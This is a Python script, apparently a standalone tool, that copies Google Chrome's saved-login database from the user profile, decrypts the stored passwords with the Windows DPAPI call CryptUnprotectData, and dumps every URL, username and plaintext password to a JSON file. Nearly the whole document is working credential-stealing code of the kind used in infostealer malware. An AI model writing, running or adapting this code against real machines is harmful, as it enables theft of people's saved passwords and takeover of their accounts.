# python 3.7.6 | pip install pypiwin32 | name must be ChromeExtract.py
import os
import sys
import sqlite3
import json
from shutil import copyfile
from time import sleep

try:
    import win32crypt
except:
    pass

def main():
    info_list = []
    path = getpath()
    print(path + "Login Data")
    try:
        #get path to where login data should be
        p = os.path.realpath(__file__).replace("ChromeExtract.py","\Login Data")
        print("p",p)
        connection = sqlite3.connect(p)
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            print("Mac OSX not supported.")
            sys.exit(0)

        for origin_url, username, password in value:
            if os.name == 'nt':
                try:
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]
                except:
                    print('e')
            
            if password:
                info_list.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
        else:
            print(e)
        sys.exit(0)
    return info_list


def getpath():
    if os.name == "nt":
        # This is the Windows Path
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
    elif os.name == "posix":
        PathName = os.getenv('HOME')
        if sys.platform == "darwin":
            # This is the OS X Path
            PathName += '/Library/Application Support/Google/Chrome/Default/'
        else:
            # This is the Linux Path
            PathName += '/.config/google-chrome/Default/'
    if not os.path.isdir(PathName):
        print('[!] Chrome Doesn\'t exists')
        sys.exit(0)
    return PathName


def output_json(info):
	try:
		with open('passwords.json', 'w') as json_file:
			json.dump({'password_items':info},json_file)
			print("Data written to chromepass-passwords.json")
	except EnvironmentError:
		print('EnvironmentError: cannot write data')
#copy Login Data
def copy_data():
    path = getpath()
    path = path + "Login Data"
    dst = os.path.realpath(__file__).replace("ChromeExtract.py","\Login Data")
    copyfile(path, dst)
    sleep(3)
    output_json(main())

if __name__ == '__main__':
    copy_data()
